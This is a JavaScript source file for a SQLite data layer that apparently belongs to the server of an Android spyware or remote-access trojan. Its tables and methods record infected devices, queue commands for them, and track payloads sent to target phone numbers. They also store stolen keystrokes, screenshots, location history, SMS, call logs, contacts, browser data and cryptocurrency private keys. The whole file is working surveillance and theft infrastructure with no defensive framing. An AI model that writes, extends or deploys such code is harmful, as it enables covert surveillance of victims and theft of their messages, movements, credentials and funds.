const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const path = require('path');
const fs = require('fs-extra');
const crypto = require('crypto');
const config = require('./config');

class Database {
    constructor() {
        this.db = null;
        this.init();
    }
    
    async init() {
        // Ensure database directory exists
        await fs.ensureDir(path.dirname(config.paths.database));
        
        this.db = await open({
            filename: config.paths.database,
            driver: sqlite3.Database
        });
        
        await this.createTables();
        await this.createIndexes();
        await this.createTriggers();
        
        console.log('✅ Database initialized successfully');
    }
    
    async createTables() {
        // Sessions table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                device_model TEXT,
                device_brand TEXT,
                android_version TEXT,
                android_sdk INTEGER,
                ip_address TEXT,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                battery INTEGER,
                battery_status TEXT,
                storage_total INTEGER,
                storage_used INTEGER,
                storage_free INTEGER,
                ram_total INTEGER,
                ram_used INTEGER,
                ram_free INTEGER,
                cpu_cores INTEGER,
                cpu_usage REAL,
                temperature REAL,
                is_rooted BOOLEAN,
                is_emulator BOOLEAN,
                installed_apps_count INTEGER,
                status TEXT DEFAULT 'active',
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_ip TEXT,
                metadata TEXT
            )
        `);
        
        // Commands history
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                command TEXT NOT NULL,
                command_type TEXT,
                parameters TEXT,
                result TEXT,
                status TEXT DEFAULT 'pending',
                execution_time INTEGER,
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Payloads
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT UNIQUE NOT NULL,
                payload_type TEXT,
                filename TEXT,
                filesize INTEGER,
                md5 TEXT,
                sha256 TEXT,
                target_number TEXT,
                target_name TEXT,
                sent_at DATETIME,
                delivered BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                execution_details TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Extracted data
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS extracted_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                data_type TEXT,
                data_content TEXT,
                file_path TEXT,
                file_size INTEGER,
                metadata TEXT,
                extracted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Keylogs
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                log_data TEXT,
                application TEXT,
                window_title TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Screenshots
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                screenshot_path TEXT,
                thumbnail_path TEXT,
                width INTEGER,
                height INTEGER,
                size INTEGER,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Location history
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS location_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                accuracy REAL,
                speed REAL,
                provider TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Call logs
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS call_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                phone_number TEXT,
                call_type TEXT,
                duration INTEGER,
                timestamp DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // SMS messages
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS sms_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                phone_number TEXT,
                message_body TEXT,
                message_type TEXT,
                timestamp DATETIME,
                read_status BOOLEAN,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Contacts
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                contact_name TEXT,
                phone_numbers TEXT,
                emails TEXT,
                organization TEXT,
                photo_path TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Installed apps
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS installed_apps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                app_name TEXT,
                package_name TEXT,
                version TEXT,
                version_code INTEGER,
                install_date DATETIME,
                update_date DATETIME,
                size INTEGER,
                is_system BOOLEAN,
                permissions TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Browser data
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS browser_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                browser_type TEXT,
                data_type TEXT,
                data_content TEXT,
                url TEXT,
                timestamp DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Crypto wallets
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS crypto_wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                wallet_type TEXT,
                wallet_address TEXT,
                private_key TEXT,
                balance REAL,
                last_updated DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Attack logs
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                attack_type TEXT,
                target TEXT,
                status TEXT,
                result TEXT,
                started_at DATETIME,
                ended_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // System logs
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_level TEXT,
                message TEXT,
                source TEXT,
                metadata TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Backups
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS backups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                backup_id TEXT UNIQUE,
                session_id TEXT,
                backup_type TEXT,
                backup_path TEXT,
                backup_size INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                restored_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Settings
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                setting_key TEXT UNIQUE,
                setting_value TEXT,
                setting_type TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
    }
    
    async createIndexes() {
        // Indexes for better performance
        await this.db.exec(`
            CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status);
            CREATE INDEX IF NOT EXISTS idx_sessions_last_seen ON sessions(last_seen);
            CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_id);
            CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
            CREATE INDEX IF NOT EXISTS idx_keylogs_session ON keylogs(session_id);
            CREATE INDEX IF NOT EXISTS idx_location_session ON location_history(session_id);
            CREATE INDEX IF NOT EXISTS idx_call_logs_session ON call_logs(session_id);
            CREATE INDEX IF NOT EXISTS idx_sms_session ON sms_messages(session_id);
            CREATE INDEX IF NOT EXISTS idx_contacts_session ON contacts(session_id);
            CREATE INDEX IF NOT EXISTS idx_apps_session ON installed_apps(session_id);
        `);
    }
    
    async createTriggers() {
        // Update last_seen on session update
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS update_session_last_seen
            AFTER UPDATE ON sessions
            BEGIN
                UPDATE sessions SET last_seen = CURRENT_TIMESTAMP WHERE id = NEW.id;
            END
        `);
        
        // Log command execution
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS log_command_execution
            AFTER UPDATE ON commands
            WHEN NEW.status = 'executed'
            BEGIN
                INSERT INTO system_logs (log_level, message, source, metadata)
                VALUES ('INFO', 'Command executed', 'commands', json_object('command_id', NEW.id, 'session_id', NEW.session_id));
            END
        `);
    }
    
    // Session Methods
    async addSession(sessionId, deviceInfo) {
        const stmt = await this.db.prepare(`
            INSERT OR REPLACE INTO sessions (
                session_id, device_name, device_model, device_brand, android_version,
                android_sdk, ip_address, country, city, latitude, longitude,
                battery, battery_status, storage_total, storage_used, storage_free,
                ram_total, ram_used, ram_free, cpu_cores, cpu_usage, temperature,
                is_rooted, is_emulator, installed_apps_count, status, first_seen, last_seen, last_ip, metadata
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);
        
        await stmt.run(
            sessionId,
            deviceInfo.name || 'Unknown',
            deviceInfo.model || 'Unknown',
            deviceInfo.brand || 'Unknown',
            deviceInfo.androidVersion || 'Unknown',
            deviceInfo.androidSdk || 0,
            deviceInfo.ip || '0.0.0.0',
            deviceInfo.country || 'Unknown',
            deviceInfo.city || 'Unknown',
            deviceInfo.latitude || 0,
            deviceInfo.longitude || 0,
            deviceInfo.battery || 0,
            deviceInfo.batteryStatus || 'Unknown',
            deviceInfo.storageTotal || 0,
            deviceInfo.storageUsed || 0,
            deviceInfo.storageFree || 0,
            deviceInfo.ramTotal || 0,
            deviceInfo.ramUsed || 0,
            deviceInfo.ramFree || 0,
            deviceInfo.cpuCores || 0,
            deviceInfo.cpuUsage || 0,
            deviceInfo.temperature || 0,
            deviceInfo.isRooted ? 1 : 0,
            deviceInfo.isEmulator ? 1 : 0,
            deviceInfo.installedAppsCount || 0,
            'active',
            new Date().toISOString(),
            new Date().toISOString(),
            deviceInfo.ip || '0.0.0.0',
            JSON.stringify(deviceInfo.metadata || {})
        );
        
        await stmt.finalize();
        return await this.getSession(sessionId);
    }
    
    async getSession(sessionId) {
        return await this.db.get('SELECT * FROM sessions WHERE session_id = ?', sessionId);
    }
    
    async getActiveSessions() {
        return await this.db.all('SELECT * FROM sessions WHERE status = "active" ORDER BY last_seen DESC');
    }
    
    async updateSession(sessionId, updates) {
        const fields = Object.keys(updates).map(k => `${k} = ?`).join(', ');
        const values = [...Object.values(updates), sessionId];
        await this.db.run(`UPDATE sessions SET ${fields}, last_seen = CURRENT_TIMESTAMP WHERE session_id = ?`, values);
    }
    
    async killSession(sessionId) {
        await this.db.run('UPDATE sessions SET status = "killed" WHERE session_id = ?', sessionId);
    }
    
    // Command Methods
    async addCommand(sessionId, command, commandType, parameters = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO commands (session_id, command, command_type, parameters, status)
            VALUES (?, ?, ?, ?, 'pending')
        `);
        await stmt.run(sessionId, command, commandType, parameters ? JSON.stringify(parameters) : null);
        await stmt.finalize();
        
        return await this.db.get('SELECT last_insert_rowid() as id');
    }
    
    async updateCommandResult(commandId, result, status = 'executed') {
        await this.db.run(`
            UPDATE commands 
            SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP 
            WHERE id = ?
        `, result, status, commandId);
    }
    
    async getCommandHistory(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM commands 
            WHERE session_id = ? 
            ORDER BY sent_at DESC 
            LIMIT ?
        `, sessionId, limit);
    }
    
    // Payload Methods
    async addPayload(payloadId, payloadType, filename, targetNumber) {
        const stmt = await this.db.prepare(`
            INSERT INTO payloads (payload_id, payload_type, filename, target_number, status)
            VALUES (?, ?, ?, ?, 'generated')
        `);
        await stmt.run(payloadId, payloadType, filename, targetNumber);
        await stmt.finalize();
    }
    
    async markPayloadDelivered(payloadId) {
        await this.db.run(`
            UPDATE payloads 
            SET delivered = 1, status = 'delivered', sent_at = CURRENT_TIMESTAMP 
            WHERE payload_id = ?
        `, payloadId);
    }
    
    async markPayloadExecuted(payloadId, executionDetails) {
        await this.db.run(`
            UPDATE payloads 
            SET executed = 1, status = 'executed', execution_details = ?
            WHERE payload_id = ?
        `, JSON.stringify(executionDetails), payloadId);
    }
    
    // Data Extraction Methods
    async saveExtractedData(sessionId, dataType, dataContent, metadata = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO extracted_data (session_id, data_type, data_content, metadata)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(sessionId, dataType, dataContent, metadata ? JSON.stringify(metadata) : null);
        await stmt.finalize();
    }
    
    async getExtractedData(sessionId, dataType = null) {
        let query = 'SELECT * FROM extracted_data WHERE session_id = ?';
        const params = [sessionId];
        
        if (dataType) {
            query += ' AND data_type = ?';
            params.push(dataType);
        }
        
        query += ' ORDER BY extracted_at DESC';
        
        return await this.db.all(query, params);
    }
    
    // Keylogger Methods
    async addKeylog(sessionId, logData, application = null, windowTitle = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO keylogs (session_id, log_data, application, window_title)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(sessionId, logData, application, windowTitle);
        await stmt.finalize();
    }
    
    async getKeylogs(sessionId, limit = 1000) {
        return await this.db.all(`
            SELECT * FROM keylogs 
            WHERE session_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ?
        `, sessionId, limit);
    }
    
    async clearKeylogs(sessionId) {
        await this.db.run('DELETE FROM keylogs WHERE session_id = ?', sessionId);
    }
    
    // Location Methods
    async addLocation(sessionId, latitude, longitude, altitude, accuracy, speed, provider) {
        const stmt = await this.db.prepare(`
            INSERT INTO location_history (session_id, latitude, longitude, altitude, accuracy, speed, provider)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, latitude, longitude, altitude, accuracy, speed, provider);
        await stmt.finalize();
    }
    
    async getLocationHistory(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM location_history 
            WHERE session_id = ? 
            ORDER BY captured_at DESC 
            LIMIT ?
        `, sessionId, limit);
    }
    
    // Call Log Methods
    async addCallLog(sessionId, phoneNumber, callType, duration, timestamp) {
        const stmt = await this.db.prepare(`
            INSERT INTO call_logs (session_id, phone_number, call_type, duration, timestamp)
            VALUES (?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, phoneNumber, callType, duration, timestamp);
        await stmt.finalize();
    }
    
    // SMS Methods
    async addSMS(sessionId, phoneNumber, messageBody, messageType, timestamp, readStatus = false) {
        const stmt = await this.db.prepare(`
            INSERT INTO sms_messages (session_id, phone_number, message_body, message_type, timestamp, read_status)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, phoneNumber, messageBody, messageType, timestamp, readStatus);
        await stmt.finalize();
    }
    
    // Contact Methods
    async addContact(sessionId, contactName, phoneNumbers, emails, organization, photoPath = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO contacts (session_id, contact_name, phone_numbers, emails, organization, photo_path)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, contactName, JSON.stringify(phoneNumbers), JSON.stringify(emails), organization, photoPath);
        await stmt.finalize();
    }
    
    // App Methods
    async addInstalledApp(sessionId, appName, packageName, version, versionCode, installDate, updateDate, size, isSystem, permissions) {
        const stmt = await this.db.prepare(`
            INSERT INTO installed_apps (session_id, app_name, package_name, version, version_code, install_date, update_date, size, is_system, permissions)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, appName, packageName, version, versionCode, installDate, updateDate, size, isSystem ? 1 : 0, JSON.stringify(permissions));
        await stmt.finalize();
    }
    
    // Browser Data Methods
    async addBrowserData(sessionId, browserType, dataType, dataContent, url = null, timestamp = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO browser_data (session_id, browser_type, data_type, data_content, url, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, browserType, dataType, dataContent, url, timestamp || new Date().toISOString());
        await stmt.finalize();
    }
    
    // Crypto Wallet Methods
    async addCryptoWallet(sessionId, walletType, walletAddress, privateKey, balance = 0) {
        const stmt = await this.db.prepare(`
            INSERT INTO crypto_wallets (session_id, wallet_type, wallet_address, private_key, balance, last_updated)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `);
        await stmt.run(sessionId, walletType, walletAddress, privateKey, balance);
        await stmt.finalize();
    }
    
    // Attack Log Methods
    async addAttackLog(sessionId, attackType, target, status = 'started') {
        const stmt = await this.db.prepare(`
            INSERT INTO attack_logs (session_id, attack_type, target, status, started_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        `);
        await stmt.run(sessionId, attackType, target, status);
        await stmt.finalize();
        
        return await this.db.get('SELECT last_insert_rowid() as id');
    }
    
    async updateAttackLog(attackId, status, result = null) {
        await this.db.run(`
            UPDATE attack_logs 
            SET status = ?, result = ?, ended_at = CURRENT_TIMESTAMP 
            WHERE id = ?
        `, status, result, attackId);
    }
    
    // Backup Methods
    async createBackup(sessionId, backupType, backupPath, backupSize) {
        const backupId = crypto.randomBytes(16).toString('hex');
        const stmt = await this.db.prepare(`
            INSERT INTO backups (backup_id, session_id, backup_type, backup_path, backup_size)
            VALUES (?, ?, ?, ?, ?)
        `);
        await stmt.run(backupId, sessionId, backupType, backupPath, backupSize);
        await stmt.finalize();
        return backupId;
    }
    
    // System Log Methods
    async addSystemLog(logLevel, message, source, metadata = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO system_logs (log_level, message, source, metadata)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(logLevel, message, source, metadata ? JSON.stringify(metadata) : null);
        await stmt.finalize();
    }
    
    // Statistics Methods
    async getStatistics() {
        const stats = {};
        
        stats.totalSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions');
        stats.activeSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions WHERE status = "active"');
        stats.totalCommands = await this.db.get('SELECT COUNT(*) as count FROM commands');
        stats.totalKeylogs = await this.db.get('SELECT COUNT(*) as count FROM keylogs');
        stats.totalLocations = await this.db.get('SELECT COUNT(*) as count FROM location_history');
        stats.totalSMS = await this.db.get('SELECT COUNT(*) as count FROM sms_messages');
        stats.totalCalls = await this.db.get('SELECT COUNT(*) as count FROM call_logs');
        stats.totalContacts = await this.db.get('SELECT COUNT(*) as count FROM contacts');
        stats.totalApps = await this.db.get('SELECT COUNT(*) as count FROM installed_apps');
        stats.totalPayloads = await this.db.get('SELECT COUNT(*) as count FROM payloads');
        stats.executedPayloads = await this.db.get('SELECT COUNT(*) as count FROM payloads WHERE executed = 1');
        
        return stats;
    }
    
    // Cleanup Methods
    async cleanupOldData(daysToKeep = 30) {
        const cutoffDate = new Date();
        cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
        const cutoff = cutoffDate.toISOString();
        
        await this.db.run('DELETE FROM keylogs WHERE timestamp < ?', cutoff);
        await this.db.run('DELETE FROM location_history WHERE captured_at < ?', cutoff);
        await this.db.run('DELETE FROM system_logs WHERE timestamp < ?', cutoff);
        await this.db.run('DELETE FROM attack_logs WHERE started_at < ?', cutoff);
    }
    
    // Export/Import
    async exportDatabase(exportPath) {
        await fs.copy(config.paths.database, exportPath);
        return exportPath;
    }
    
    async vacuum() {
        await this.db.run('VACUUM');
    }
    
    async close() {
        if (this.db) {
            await this.db.close();
        }
    }
}

module.exports = new Database();
